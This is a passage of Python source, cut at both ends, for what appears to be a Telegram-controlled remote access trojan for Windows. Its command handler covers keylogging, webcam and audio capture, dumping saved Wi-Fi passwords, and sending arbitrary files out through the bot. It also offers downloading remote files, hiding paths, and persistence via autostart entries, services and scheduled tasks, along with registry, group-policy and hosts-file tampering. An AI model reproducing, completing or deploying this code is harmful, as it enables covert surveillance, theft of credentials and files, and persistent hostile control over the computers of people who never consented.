keyboard -l  —  Get current keyboard layout\n
keyboard -s (layout)  —  Set keyboard layout\n
keyboard -v (0-31)  —  Set keyboard speed\n
keyboard -d (0-3)  —  Set keyboard delay\n
keyboard -t (text) -d (second)  —  Type on keyboard\n
keyboard -k (key) -p (amount) -d (second)  —  Press key or hotkey on keyboard\n
keyboard -c -k|-h (key) -n (new_key)  —  Remap key or hotkey on keyboard\n
keyboard -b (key)  —  Block key or hotkey on keyboard\n
keyboard -r  —  Reset keyboard settings
''')
            return
        
        case 'clipboard':
            send('''
clipboard -g  —  Get data from clipboard\n
clipboard -c (data)  —  Copy data to clipboard\n
clipboard -r  —  Clear clipboard
''')
            return
        
        case 'screen':
            send('''
screen -e  —  Turn on screen\n     
screen -d  —  Turn off screen\n
screen -s  —  Take screenshot\n
screen -w (path)  —  Change wallpaper
''')
            return
        
        case 'webcam':
            png = webcam_screenshot()

            send(png, doc='webcam.png') if png else send('failed to take screenshot from webcam [-]')
            return
        
        case 'audio':
            send('audio (second)  —  Record audio\n\naudio -p (path)  —  Play audio')
            return
        
        case 'img':
            send('img (path)  —  Display image')
            return
        
        case 'msg':
            send('msg (-p|-s|-i|-w|-e) (title) -t (text)  —  Display message')
            return
        
        case 'keylogger':
            send('''
keylogger -g (base|char|hotkey|no hotkey)  —  Get keylogger data\n
keylogger -e  —  Enable keylogger\n
keylogger -d  —  Disable keylogger\n
keylogger -s  —  Keylogger status\n
keylogger -r  —  Reset keylogger data
''')
            return
        
        

    _c = cmd.split(maxsplit=1)

    if len(_c) != 2:
        send(f'command not found ({cmd})')
        return
    
    args = _c[1]



    match _c[0].lower():
        case 'repeat':
            if exp := parse_cmd(r'(?P<command>.*?)\s*-c\s*(?P<amount>\d+)\s*-d\s*(?P<delay>\d+)', args):
                command, amount, delay = exp['command'], int(exp['amount']), int(exp['delay'])

                send(f'started repeating ({command}) -c ({amount}) -s ({delay}) [*]')

                for n in range(1, amount + 1):
                    try:
                        execute(command, send)
                    except BaseException as error:
                        send(f'failed to repeat command {n} ({command}) [-]\n\n{type(error).__name__}({error})')
                    else:
                        send(f'command is repeated {n} ({command}) [+]')

                    sleep(delay)

                send(f'end of repeat command ({command}) -c ({amount}) -s ({delay}) [*]')
                return
        case 'config':
            if args == '-g':
                send(f'''
IS_EXE = {IS_EXE}
                     

#-------------------------|NECESSARILY|-------------------------#
TOKEN = {TOKEN}
PASSWORD = {PASSWORD}
SEED = {SEED}
PATH = {PATH}
#-----------------------------|END|-----------------------------#



#-------------------------|OPTIONAL|-------------------------#
BOT_FILE_NAME = {BOT_FILE_NAME}
BOT_TASK_NAME = {BOT_TASK_NAME}
BOT_TASK_DESCRIPTION = {BOT_TASK_DESCRIPTION}
BOT_EXE = {BOT_EXE}
#----------------------------|END|---------------------------#
''')
                return
            elif exp := parse_cmd(r'(?P<const>TOKEN|PASSWORD|SEED)\s*-s\s*(?P<value>.+)', args):
                value = exp['value'] 
            
                match exp['const']:
                    case 'TOKEN':
                        if not http(f'https://api.telegram.org/bot{value}/getMe', json=True).get('ok', False):
                            send('Telegram bot (TOKEN) is invalid')
                            return

                        write_file(CONFIG_TOKEN, encrypt(value))
                        send(f'TOKEN is changed ({TOKEN}) --> ({value}) [+]')
                    case 'PASSWORD':
                        write_file(CONFIG_PASSWORD, encrypt(value))
                        value = sha256(value.encode()).hexdigest()
                        send(f'PASSWORD is changed ({PASSWORD}) --> ({value}) [+]')
                    case 'SEED':
                        if not value.isdigit():
                            send('(SEED) is invalid')
                            return
                        
                        write_file(CONFIG_SEED, value)
                        send(f'SEED is changed ({SEED}) --> ({value}) [+]')
                        
                return
            elif exp := parse_cmd(r'-r\s*(?P<const>TOKEN|PASSWORD|SEED)', args):
                match exp['const']:
                    case 'TOKEN':
                        if os.path.isfile(CONFIG_TOKEN):
                            os.remove(CONFIG_TOKEN)
                            send('reset (TOKEN) [+]')
                    case 'PASSWORD':
                        if os.path.isfile(CONFIG_PASSWORD):
                            os.remove(CONFIG_PASSWORD)
                            send('reset (PASSWORD) [+]')
                    case 'SEED':
                        if os.path.isfile(CONFIG_SEED):
                            os.remove(CONFIG_SEED)
                            send('reset (SEED) [+]')

                return
        case 'account':
            if args == '-g':
                accounts = []

                for n in os.listdir(PATH_MEM):
                    try:
                        name, date = decrypt(read_file(os.path.join(PATH_MEM, n))).split('=')
                        accounts.append([((int(n) ^ KEY[1]) >> KEY[0]), f'@{name}', date])
                    except:
                        continue
                
                send(tabulate(accounts, headers=[('ID'), ('NAME'), ('CONNECTION-DATE')], tablefmt='grid'), doc='account.txt') if accounts else send('no accounts [*]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<id>\d+)', args):
                session_id = int(exp['id'])
                path_id = os.path.join(PATH_MEM, mem_id(session_id))
                
                if os.path.exists(path_id):
                    os.remove(path_id)
                    send(f'account is deleted ({session_id}) [+]')
                else:
                    send(f'failed to delete account ({session_id}) [-]')

                return
        case 'autostart':
            if args == '-l':
                try:
                    autostart_files = decrypt(read_file(FILE_AUTOSTART)).splitlines()
                except:
                    send('no files in bot autostart [*]')
                    return

                bfiles = []
                
                for line in autostart_files:
                    try:
                        n = line.split('=')

                        bname, bpath, bwindow = n[0].split('\u200B')
                        bargs, bdate = n[1].split('\u200B')

                        bfiles.append([bname, bpath, bargs, bwindow.upper(), bdate])
                    except:
                        continue

                send(tabulate(bfiles, headers=[('NAME'), ('PATH'), ('ARGUMENTS'), ('WINDOW'), ('DATE')], tablefmt='grid'), doc='autostart.txt') if bfiles else send('no files in bot autostart [*]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.*?)\s*-w\s*(?P<window>true|false)', args):
                bname, bpath, bargs, bwindow, date = exp['name'], exp['path'], exp['args'], exp['window'], get_date()

                bpath = os.path.realpath(bpath) if os.path.isfile(bpath) else os.path.join(PATH_SHARE, bpath)
  
                if not os.path.isfile(bpath):
                    send(f'file does not exist ({os.path.split(bpath)[-1]}) [*]')
                    return
 
                if not os.path.isfile(FILE_AUTOSTART):
                    write_file(FILE_AUTOSTART, '')

                send(f'added file ({bname}) in bot autostart [+]' if change_file(FILE_AUTOSTART, bname, f'{bname}\u200B{bpath}\u200B{bwindow}={bargs}\u200B{date[0]} | {date[1]}', enc=True) else f'failed to add file ({bname}) in bot autostart [-]')
                return        
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                bname = exp['name']
                
                send(f'deleted file from bot autostart ({bname}) [+]' if change_file(FILE_AUTOSTART, bname, bname, delete=True, enc=True) else f'file does not exist ({bname}) in bot autostart [*]') if os.path.isfile(FILE_AUTOSTART) else send('no files in bot autostart [*]')
                return
            elif args == '-r':
                if os.path.isfile(FILE_AUTOSTART):
                    write_file(FILE_AUTOSTART, '')
                    send('bot autostart is reset [+]')
                else:
                    send('no files in bot autostart [*]')

                return
        case 'cd':
            if os.path.isdir(args):
                os.chdir(args)
                send(f'directory changed ({args}) [+]\n\nCURRENT DIRECTORY: {os.getcwd()}')
            else:
                send(f'directory does not exist ({args}) [*]')

            return
        case 'mkfile':        
            if exp := parse_cmd(r'(?P<path>.*?)\s*-d\s*(?P<data>.+)', args):
                path = exp['path']

                try:
                    write_file(path, exp['data'].replace('\\t', '\t').replace('\\n', '\n'))
                except:
                    send(f'failed to create file ({path}) [-]')
                else:
                    send(f'file is created ({path}) [+]')

                return
        case 'mkdir':
            try:
                mkdir(args)
            except:
                send(f'failed to create dir ({args}) [-]')
            else:
                send(f'dir is created ({args}) [+]')
            
            return
        case 'rn':           
            if exp := parse_cmd(r'(?P<name>.*?)\s*-n\s*(?P<new_name>.+)', args):
                current_name, new_name = exp['name'], exp['new_name']

                path = os.path.split(os.path.realpath(current_name))[0]

                if os.path.exists(current_name):
                    try:
                        os.rename(current_name, os.path.join(path, new_name))
                    except:
                        send(f'failed to rename path ({current_name}) [-]')
                    else:
                        send(f'path is renamed ({current_name}) --> ({new_name}) [+]')
                else:
                    send(f'path does not exist ({current_name}) [*]')

                return
        case 'rm':
            if os.path.isfile(args):
                try:
                    os.remove(args)
                except:
                    send(f'failed to delete file ({args}) [-]')
                else:
                    send(f'file is deleted ({args}) [+]')
            else:
                send(f'file does not exist ({args}) [*]')

            return
        case 'rmdir':
            if os.path.isdir(args):
                try:
                    shutil.rmtree(args)
                except:
                    send(f'failed to delete dir ({args}) [-]')
                else:
                    send(f'dir is deleted ({args}) [+]')
            else:
                send(f'dir does not exist ({args}) [*]')
            
            return
        case 'cp':        
            if exp := parse_cmd(r'(?P<from_path>.*?)\s*-t\s*(?P<to_path>.+)', args):
                from_path, to_path = exp['from_path'], exp['to_path']

                if os.path.exists(from_path):
                    try:
                        (shutil.copy if os.path.isfile(from_path) else shutil.copytree)(from_path, to_path)
                    except:
                        send(f'failed to copy path ({from_path}) [-]')
                    else:
                        send(f'path is copied ({from_path}) --> ({to_path}) [+]')
                else:
                    send(f'path does not exist ({from_path}) [*]')

                return
        case 'mv':           
            if exp := parse_cmd(r'(?P<from_path>.*?)\s*-t\s*(?P<to_path>.+)', args):
                from_path, to_path = exp['from_path'], exp['to_path']

                if os.path.exists(from_path):
                    try:
                        shutil.move(from_path, to_path)
                    except:
                        send(f'failed to move path ({from_path}) [-]')
                    else:
                        send(f'path is moved ({from_path}) --> ({to_path}) [+]')
                else:
                    send(f'path does not exist ({from_path}) [*]')

                return
        case 'hide':
            if os.path.exists(args):
                send(f'path is hidden ({args}) [+]' if hide(args) else f'failed to hide path ({args}) [-]')
            else:
                send(f'path does not exist ({args}) [*]')
            
            return
        case 'unhide':
            if os.path.exists(args):
                send(f'path is unhidden ({args}) [+]' if unhide(args) else f'failed to unhide path ({args}) [-]')
            else:
                send(f'path does not exist ({args}) [*]')
            
            return
        case 'cat':
            if os.path.isfile(args):
                try:
                    file_data = read_file(args, b=True)
                    send(file_data, doc=os.path.split(args)[-1]) if file_data else send(f'file is empty ({args}) [*]')
                except:
                    send(f'failed to download file ({args}) [-]')
            else:
                send(f'file does not exist ({args}) [*]')

            return
        case 'inet':
            if args == '-e':
                shell('ipconfig /renew')
                return
            elif args == '-d':
                shell('ipconfig /release')
                return
        case 'wifi':
            if args == '-g':
                wifi_list = wifi()

                send(tabulate(wifi_list, headers=[('SSID'), ('BSSID'), ('GHZ'), ('CHANNEL'), ('AUTH'), ('CIPHER'), ('SIGNAL')], tablefmt='grid'), doc='wifi.txt') if wifi_list else send(NULL)
                return
            elif args == '-p':
                wifi_password_list = wifi_password()

                send(tabulate(wifi_password_list, headers=[('SSID'), ('PASSWORD')], tablefmt='grid'), doc='wifi_password.txt') if wifi_password_list else send(NULL)
                return
        case 'site':           
            if exp := parse_cmd(r'-p\s*(?P<url>.+)', args):
                url = exp['url']

                try:
                    open_site(url)
                except:
                    send(f'failed to open website ({url}) [-]')
                else:
                    send(f'website is opened ({url}) [+]')
                
                return
            elif exp := parse_cmd(r'-d\s*(?P<url>.*?)\s*-n\s*(?P<name>.+)', args):
                url, name = exp['url'], exp['name']

                query_http = http(url)

                if query_http is None:
                    send(f'failed to query website ({url}) [*]')
                    return

                try:
                    write_file(os.path.join(PATH_SHARE, name), query_http)
                except:
                    send(f'failed to download from website ({url}) [-]')
                else:
                    send(f'file is downloaded from website ({url}) --> ({name}) [+]')

                return
            elif args == '-l':
                if os.path.isfile(FILE_HOSTS):
                    bsites = []

                    for line in read_file(FILE_HOSTS).splitlines():
                        n = line.split()

                        if (len(n) > 4) and (n[2] == '#'):
                            bsites.append([n[1], f'{n[-1]} | {n[-2]}'])

                    send(tabulate(bsites, headers=[('DOMAIN'), ('DATE')], tablefmt='grid'), doc='blocked_sites.txt') if bsites else send('no blocked sites [*]')
                else:
                    send('no blocked sites [*]')

                return    
            elif exp := parse_cmd(r'-b\s*(?P<domain>.+)', args):
                domain, date = exp['domain'], get_date()

                try:
                    verify_domain(domain)
                except:
                    send(f'domain does not exist ({domain}) [*]')
                    return

                if not os.path.isfile(FILE_HOSTS):
                    write_file(FILE_HOSTS, '')

                send(f'site is blocked ({domain}) [+]' if change_file(FILE_HOSTS, domain, f'127.0.0.1    {domain}    # {date[0]} {date[1]}') else f'failed to block site ({domain}) [-]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<domain>.+)', args):
                domain = exp['domain']

                send(f'site is unblocked ({domain}) [+]' if change_file(FILE_HOSTS, domain, domain, delete=True) else f'site does not exist ({domain}) [*]') if os.path.isfile(FILE_HOSTS) else send('no blocked sites [*]')
                return
            elif args == '-r':
                if os.path.isfile(FILE_HOSTS):
                    write_file(FILE_HOSTS, '')
                    send('sites is unblocked [+]')
                else:
                    send('no blocked sites [*]')
                    
                return
        case 'device':
            if args == '-g':
                with StringIO() as buf:
                    device_list = device('devices')

                    if not device_list:
                        send(NULL)
                        return 
                    
                    for n in device_list:
                        buf.write(f'''ID: {n[0]}
GUID: {n[1]}
NAME: {n[2]}
TYPE: {n[3]}
VENDOR: {n[4]}
DRIVER: {n[5]}
STATUS: {n[6]}\n
''')
                
                    send(buf.getvalue(), doc='device.txt')
                    return
            elif exp := parse_cmd(r'-q\s*(?P<id>.+)', args):
                dev = exp['id']

                with StringIO() as buf:
                    dquery = device('query', id=dev)
            
                    if not dquery:
                        send(f'device does not exist ({dev}) [*]')
                        return
                
                    for n in dquery:
                        buf.write(f'''ID: {n[0]}
GUID: {n[1]}
NAME: {n[2]}
TYPE: {n[3]}
VENDOR: {n[4]}
DRIVER: {n[5]}
STATUS: {n[6]}\n
''')
                
                    send(buf.getvalue(), doc='device.txt')                 
                    return
            elif exp := parse_cmd(r'-i\s*driver\s*(?P<driver>.+)', args):
                driver = exp['driver']

                send(f'device driver is installed ({driver}) [+]' if device('install_driver', driver=driver) else f'failed to install device driver ({driver}) [-]')
                return
            elif exp := parse_cmd(r'-s\s*(?P<type>device|driver)\s*(?P<id>.+)', args):
                dt, dev = exp['type'] == 'device', exp['id']

                df = device('delete' if dt else 'delete_driver', id=dev)

                if df is None:
                    send(f'device does not exist ({dev}) [*]')
                    return

                send('device ' + ('' if dt else 'driver ') + f'is deleted ({dev}) [+]' if df else 'failed to delete device ' + ('' if dt else 'driver ') + f'({dev}) [-]')
                return
            elif exp := parse_cmd(r'-e\s*(?P<id>.+)', args):
                dev = exp['id']

                df = device('enable', id=dev)

                if df is None:
                    send(f'device does not exist ({dev}) [*]')
                    return

                send(f'device is enabled ({dev}) [+]' if df else f'failed to enable device ({dev}) [-]')
                return
            elif exp := parse_cmd(r'-r\s*(?P<id>.+)', args):
                dev = exp['id']

                df = device('restart', id=dev)

                if df is None:
                    send(f'device does not exist ({dev}) [*]')
                    return

                send(f'device is restarted ({dev}) [+]' if df else f'failed to restart device ({dev}) [-]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<id>.+)', args):
                dev = exp['id']

                df = device('disable', id=dev)

                if df is None:
                    send(f'device does not exist ({dev}) [*]')
                    return

                send(f'device is disabled ({dev}) [+]' if df else f'failed to disable device ({dev}) [-]')
                return
            elif exp := parse_cmd(r'-v\s*(?P<dev>device_name|device_desc|bios_vendor|bios_version|bios_date|baseboard|baseboard_vendor|baseboard_version|cpu|cpu_id|cpu_mhz|cpu_vendor|os|os_edition|os_version|os_build|os_product|os_owner|os_date|node)\s*(?P<id>.+)?', args):
                dev, cid = exp['dev'], exp['id']

                if (dev in {'device_name', 'device_desc'}) and (cid is None):
                    send('device id is empty [*]')
                    return
                
                send(device('value', id=cid, changes=dev))
                return
            elif exp := parse_cmd(r'-c\s*(?P<dev>device_name|device_desc)\s*(?P<id>.*?)\s*-n\s*(?P<value>.+)', args):
                dev, cid, value = exp['dev'], exp['id'], exp['value']

                send(f'device ({cid}) ' + ('name' if dev == 'device_name' else 'description') + f' is changed ({value}) [+]' if device('change', id=cid, changes=[dev, value]) else f'failed to change device ' + ('name' if dev == 'device_name' else 'description') + f' ({cid}) [-]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<dev>bios_vendor|bios_version|bios_date|baseboard|baseboard_vendor|baseboard_version|cpu|cpu_id|cpu_mhz|cpu_vendor|os|os_edition|os_version|os_build|os_product|os_owner|os_date|node)\s*-n\s*(?P<value>.+)', args):
                dev, value = exp['dev'], exp['value']

                send(f'system ({dev}) information is changed ({value}) [+]' if device('change', changes=[dev, value]) else f'failed to change system information ({dev}) [-]')
                return
            elif args == '-u':
                device('update')
                send('devices configuration is updated [+]')
                return
            elif exp := parse_cmd(r'-p\s*(?P<path>.+)', args):
                path = exp['path']

                if not os.path.isfile(path):
                    send(f'file does not exist ({path}) [*]')
                    return
                
                try:
                    os.startfile(path, 'print')
                except:
                    send(f'failed to print file on printer ({path}) [-]')
                else:
                    send(f'file is printed on printer ({path}) [+]')

                return
        case 'reg':
            if args == '-i':
                send('''
ROOT:
\tHKEY_CLASSES_ROOT
\tHKEY_LOCAL_MACHINE
\tHKEY_CURRENT_USER
\tHKEY_CURRENT_CONFIG
\tHKEY_USERS
\tHKEY_DYN_DATA
\tHKEY_PERFORMANCE_DATA\n
TYPE:
\tnone  —  none
\tsz  —  string
\texpand_sz  —  string
\tbinary  —  bytes
\tdword  —  integer
\tdword_big_endian  —  integer
\tqword  —  integer
''')
                return           
            elif exp := parse_cmd(r'-c\s*(?P<key>.*?)\s*-n\s*(?P<name>.+)', args):
                key, name = exp['key'], exp['name']

                try:
                    reg_create_key(key, name) 
                except:
                    send(f'failed to create register key ({os.path.join(key, name)}) [-]')
                else:
                    send(f'register key is created ({os.path.join(key, name)}) [+]')
                
                return
            elif exp := parse_cmd(r'-c\s*(?P<key>.*?)\s*-n\s*(?P<name>.*?)\s*-v\s*(?P<value>.*?)\s*-t\s*(?P<type>none|sz|expand_sz|binary|dword|dword_big_endian|qword)', args):
                key, name, value, value_type = exp['key'], exp['name'], exp['value'], exp['type']
                     
                try:
                    reg_set_value(key, name, value, value_type) 
                except:
                    send(f'failed to create register value ({os.path.join(key, name)}) [-]')
                else:
                    send(f'register value is created ({os.path.join(key, name)}) [+]')
                
                return
            elif exp := parse_cmd(r'-d\s*(?P<type>-k|-v)\s*(?P<key>.*?)\s*-n\s*(?P<name>.+)', args):
                reg_dir, key, name = exp['type'] == '-k', exp['key'], exp['name']

                try:
                    reg_delete(key, name, dir=reg_dir)
                except FileNotFoundError:
                    send('register ' + ('key' if reg_dir else 'value') + f' does not exist ({os.path.join(key, name)}) [*]') 
                except:
                    send('failed to delete register ' + ('key' if reg_dir else 'value') + f' ({os.path.join(key, name)}) [-]')
                else:
                    send('register ' + ('key' if reg_dir else 'value') + f' is deleted ({os.path.join(key, name)}) [+]')

                return          
            elif exp := parse_cmd(r'-g\s*(?P<key>.*?)\s*-n\s*(?P<name>.+)', args):
                key, name = exp['key'], exp['name']

                try:
                    value, value_type = reg_get_value(key, name)
                except FileNotFoundError:
                    send(f'register value does not exist ({os.path.join(key, name)}) [*]')
                    return
                except:
                    send(f'failed to get register value ({os.path.join(key, name)}) [-]')
                    return
                
                send(f'NAME: {name}\nVALUE: {value}\nTYPE: {value_type}')
                return 
            elif exp := parse_cmd(r'-e\s*(?P<type>-k|-v)\s*(?P<key>.+)', args):
                reg_dir, key = exp['type'] == '-k', exp['key']

                try:
                    enum_list = reg_enum(key, dir=reg_dir)
                except FileNotFoundError:
                    send(f'register key does not exist ({key}) [*]') 
                    return
                except:
                    send(f'failed to get register enum ({key}) [-]')
                    return
                
                if not enum_list:
                    send(f'register enum is empty ({key}) [*]')
                    return

                with StringIO() as buf:
                    for n in enum_list:
                        buf.write(f'NAME: {n}\n\n' if reg_dir else f'NAME: {n[0]}\nVALUE: {n[1]}\nTYPE: {n[2]}\n\n')

                    send(buf.getvalue(), doc='reg.txt')
                    return
        case 'gpedit':
            if exp := parse_cmd(r'-e\s*(?P<user>machine|user)\s*(?P<type>-k|-v)\s*(?P<key>.+)', args):
                machine, gdir, key = exp['user'] == 'machine', exp['type'] == '-k', exp['key']

                gpath = os.path.join(
                    REG_KEY_MACHINE_POLICIES if machine else REG_KEY_USER_POLICIES, 
                    '' if key == 'main' else key
                )

                try:
                    enum_list = reg_enum(gpath, dir=gdir)
                except FileNotFoundError:
                    send(f'gpedit key does not exist ({key}) [*]')
                    return
                except:
                    send(f'failed to get gpedit enum ({key}) [-]')
                    return
      
                if not enum_list:
                    send(f'gpedit enum is empty ({key}) [*]')
                    return
                
                with StringIO() as buf:
                    buf.write(f'CURRENT KEY ({gpath}):\n')

                    for n in enum_list:
                        if gdir: 
                            buf.write(f'\tKEY: {n}\n\n')
                        else:
                            match n[1]:
                                case 0:
                                    gstatus = 'ALLOWED'
                                case 1:
                                    gstatus = 'BLOCKED'
                                case 2:
                                    gstatus = 'RESTRICTED'
                                case _:
                                    gstatus = NULL
                            
                            buf.write(f'\tPOLICY: {n[0]}\n\tSTATUS: {gstatus}\n\n')

                    send(buf.getvalue(), doc='gpedit.txt')
                    return
            elif exp := parse_cmd(r'-g\s*(?P<user>machine|user)\s*(?P<key>.*?)\s*-n\s*(?P<name>.+)', args):
                machine, key, name = exp['user'] == 'machine', exp['key'], exp['name']

                try:
                    gpolicy = reg_get_value(os.path.join(REG_KEY_MACHINE_POLICIES if machine else REG_KEY_USER_POLICIES, key), name) 
                except FileNotFoundError:
                    send(f'gpedit policy does not exist ({name}) [*]')
                    return
                except:
                    send(f'failed to get gpedit policy ({name}) [-]')
                    return

                match gpolicy[0]:
                    case 0:
                        gstatus = 'ALLOWED'
                    case 1:
                        gstatus = 'BLOCKED'
                    case 2:
                        gstatus = 'RESTRICTED'
                    case _:
                        gstatus = NULL

                send(f'POLICY: {name}\nSTATUS: {gstatus}')
                return
            elif exp := parse_cmd(r'-c\s*(?P<user>machine|user)\s*(?P<key>.*?)\s*-n\s*(?P<name>.*?)\s*-v\s*(?P<value>allowed|blocked|restricted)', args):
                machine, key, name, value = exp['user'] == 'machine', exp['key'], exp['name'], exp['value']

                match value:
                    case 'allowed':
                        gstatus = 0
                    case 'blocked':
                        gstatus = 1
                    case 'restricted':
                        gstatus = 2

                try:
                    reg_set_value(
                        os.path.join(REG_KEY_MACHINE_POLICIES if machine else REG_KEY_USER_POLICIES, key),
                        name,
                        gstatus,
                        'dword'
                    )
                except:
                    send(f'failed to create gpedit policy ({os.path.join(key, name)}) [-]')
                else:
                    send(f'gpedit policy is created ({os.path.join(key, name)}) [+]')

                return
            elif exp := parse_cmd(r'-d\s*(?P<user>machine|user)\s*(?P<key>.*?)\s*-n\s*(?P<name>.+)', args):
                machine, key, name = exp['user'] == 'machine', exp['key'], exp['name']

                try:
                    reg_delete(os.path.join(REG_KEY_MACHINE_POLICIES if machine else REG_KEY_USER_POLICIES, key), name, dir=False)
                except FileNotFoundError:
                    send(f'gpedit policy does not exist ({name}) [*]')
                except:
                    send(f'failed to delete gpedit policy ({name}) [-]')
                else:
                    send(f'gpedit policy is deleted ({name}) [+]')

                return
            elif args == '-u':
                shell('gpupdate /force')
                send('gpedit is updated [+]')
                return
        case 'service':
            if args == '-g':
                with StringIO() as buf:
                    service_list = service()

                    if not service_list:
                        send(NULL)
                        return
                    
                    for n in service_list:
                        buf.write(f'''PID: {n[0]}
NAME: {n[1]}
DISPLAY NAME: {n[2]}
DESCRIPTION: {n[3]}
USER: {n[4]}
COMMAND: {n[5]}
START TYPE: {n[6]}
STATUS: {n[7]}\n
''')
                
                    send(buf.getvalue(), doc='service.txt')
                    return
            elif exp := parse_cmd(r'-q\s*(?P<name>.+)', args):
                name = exp['name']

                try:
                    query_service = psutil.win_service_get(name)
                except:
                    send(f'service does not exist ({name}) [*]')
                    return
                
                try:
                    service_pid = query_service.pid()
                except:
                    service_pid = NULL

                try:
                    service_description = query_service.description()
                except:
                    service_description = NULL

                service_pid = service_pid or NULL
                service_name = query_service.name() or NULL
                service_display_name = query_service.display_name() or NULL
                service_description = service_description or NULL
                service_username = query_service.username() or NULL
                service_binpath = query_service.binpath() or NULL
                service_start_type = query_service.start_type() or NULL
                service_status = query_service.status() or NULL
                    
                send(f'''
PID: {service_pid}
NAME: {service_name}
DISPLAY NAME: {service_display_name}
DESCRIPTION: {service_description}
USER: {service_username}
COMMAND: {service_binpath}
START TYPE: {service_start_type.upper()}
STATUS: {service_status.upper()}
''')
                return    
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-n\s*(?P<display_name>.*?)\s*-d\s*(?P<description>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.*?)\s*-m\s*(?P<mode>autostart|manual|disable)', args):
                name, display_name, description, path, sargs, mode = exp['name'], exp['display_name'], exp['description'], exp['path'], exp['args'], exp['mode']

                if not os.path.isfile(path):
                    send(f'file does not exist ({path}) [*]')
                    return

                match mode:
                    case 'autostart':
                        service_mode = win32con.SERVICE_AUTO_START
                    case 'manual':
                        service_mode = win32con.SERVICE_DEMAND_START
                    case 'disable':
                        service_mode = win32con.SERVICE_DISABLED

                try:
                    (win32serviceutil.ChangeServiceConfig if exist_service(name) else win32serviceutil.InstallService)(
                        name, 
                        serviceName=name, 
                        displayName=display_name,
                        description=description,
                        exeName=os.path.realpath(path),
                        exeArgs=sargs if sargs != 'none' else None,
                        startType=service_mode
                    )
                except:
                    send(f'failed to create service ({name}) [-]')
                else:
                    send(f'service is created ({name}) [+]')
                    
                return
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                name = exp['name']

                if not exist_service(name):
                    send(f'service does not exist ({name}) [*]')
                    return

                try:
                    win32serviceutil.RemoveService(name)
                except:
                    send(f'failed to delete service ({name}) [-]')
                else:
                    send(f'service is deleted ({name}) [+]')
                
                return
            elif exp := parse_cmd(r'-m\s*(?P<mode>autostart|manual|disable)\s*(?P<name>.+)', args):
                mode, name = exp['mode'], exp['name']

                if not exist_service(name):
                    send(f'service does not exist ({name}) [*]')
                    return
                
                match mode:
                    case 'autostart':
                        service_mode = win32con.SERVICE_AUTO_START
                    case 'manual':
                        service_mode = win32con.SERVICE_DEMAND_START
                    case 'disable':
                        service_mode = win32con.SERVICE_DISABLED
                    
                try:
                    win32serviceutil.ChangeServiceConfig(
                        name,
                        serviceName=name,
                        startType=service_mode
                    )
                except:
                    send(f'failed to change service mode ({name}) [-]')
                else:
                    send(f'service mode is changed ({name}) --> ({mode}) [+]')

                return
            elif exp := parse_cmd(r'-l\s*(?P<name>.+)', args):
                name = exp['name']

                if not exist_service(name):
                    send(f'service does not exist ({name}) [*]')
                    return

                try:
                    win32serviceutil.StartService(name)
                except:
                    send(f'failed to start service ({name}) [-]')
                else:
                    send(f'service is started ({name}) [+]')

                return    
            elif exp := parse_cmd(r'-r\s*(?P<name>.+)', args):
                name = exp['name']

                if not exist_service(name):
                    send(f'service does not exist ({name}) [*]')
                    return

                try:
                    win32serviceutil.RestartService(name)
                except:
                    send(f'failed to restart service ({name}) [-]')
                else:
                    send(f'service is restarted ({name}) [+]')

                return
            elif exp := parse_cmd(r'-s\s*(?P<name>.+)', args):
                name = exp['name']

                if not exist_service(name):
                    send(f'service does not exist ({name}) [*]')
                    return

                try:
                    win32serviceutil.StopService(name)
                except:
                    send(f'failed to stop service ({name}) [-]')
                else:
                    send(f'service is stopped ({name}) [+]')

                return  
        case 'task':
            if args == '-g':
                with StringIO() as buf:
                    task_list = task()

                    if not task_list:
                        send(NULL)
                        return
                    
                    for n in task_list:
                        buf.write(f'NAME: {n[0]}\nEVENT: {n[1]}\nSTATUS: {n[2]}\n\n')

                    send(buf.getvalue(), doc='task.txt')
                    return 
            elif exp := parse_cmd(r'-q\s*(?P<name>.+)', args):
                name = exp['name']

                CoInitialize()

                if not exist_task(name):
                    send(f'task does not exist ({name}) [*]')
                    CoUninitialize()
                    return

                try:
                    qtask = scheduler().GetTask(name)
                except ConnectionError as error:
                    send(error)
                except:
                    send(f'task does not exist ({name}) [*]')
                else:
                    definition = getattr(qtask, 'Definition', None)

                    registration = getattr(definition, 'RegistrationInfo', None)
                    principal = getattr(definition, 'Principal', None)
                    actions = getattr(definition, 'Actions', None)
                    settings = getattr(definition, 'Settings', None)

                    privilege = getattr(principal, 'RunLevel', NULL)

                    if privilege != NULL:
                        privilege = 'Highest' if privilege == 1 else 'Least'

                    match getattr(principal, 'LogonType', NULL):
                        case 1:
                            logon_type = 'Interactive'
                        case 2:
                            logon_type = 'Service Account'
                        case 3:
                            logon_type = 'Password'
                        case _:
                            logon_type = NULL
                    
                    match getattr(qtask, 'State', NULL):
                        case 1:
                            status = 'Disabled'
                        case 2:
                            status = 'Queued'
                        case 3:
                            status = 'Ready'
                        case 4:
                            status = 'Running'
                        case 5:
                            status = 'Finished'
                        case _:
                            status = NULL
                        
                    command = ''
                    
                    if actions is not None:
                        for n in actions:
                            command += f'\n\tPATH: {getattr(n, "Path", NULL)}\n\tARGUMENT: {getattr(n, "Arguments", NULL)}\n'
                    
                    send(f'''NAME: {getattr(qtask, "Name", NULL)}
DESCRIPTION: {getattr(registration, "Description", NULL)}
AUTHOR: {getattr(registration, "Author", NULL)}
OWNER: {getattr(principal, "UserId", NULL)}
PRIVILEGE: {privilege}
LOGON: {logon_type}
COMMAND: ''' + (command if command else NULL + '\n') + f'''LAST RUNTIME: {getattr(qtask, "LastRunTime", NULL)}
HIDDEN: {getattr(settings, "Hidden", NULL)}
ENABLED: {getattr(qtask, "Enabled", NULL)}
STATUS: {status}
''')
                    
                CoUninitialize()
                
                return
            elif exp := parse_cmd(r'-c\s*(?P<user>system|users|user)\s*(?P<name>.*?)\s*-d\s*(?P<description>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.*?)\s*-h\s*(?P<hidden>true|false)\s*-e\s*(?P<event>.+)', args):
